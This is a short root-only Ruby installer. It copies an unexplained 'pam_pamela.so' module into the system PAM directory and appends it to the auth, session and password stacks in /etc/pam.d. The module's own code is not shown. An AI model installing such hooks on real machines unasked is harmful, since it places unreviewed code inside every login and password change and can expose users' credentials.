#!/usr/bin/ruby -w

require 'fileutils'

if Process.uid != 0
  STDERR.puts "Error you must be root"
  exit (false)
end

FileUtils.cp("pam_pamela.so", "/lib/i386-linux-gnu/security/")

array = ["auth", "session", "password"]

array.each { | file |
  File.open("/etc/pam.d/common-#{file}", "a") { | line |
    line.puts("#{file} optional pam_pamela.so")
  }
}

puts "OK"
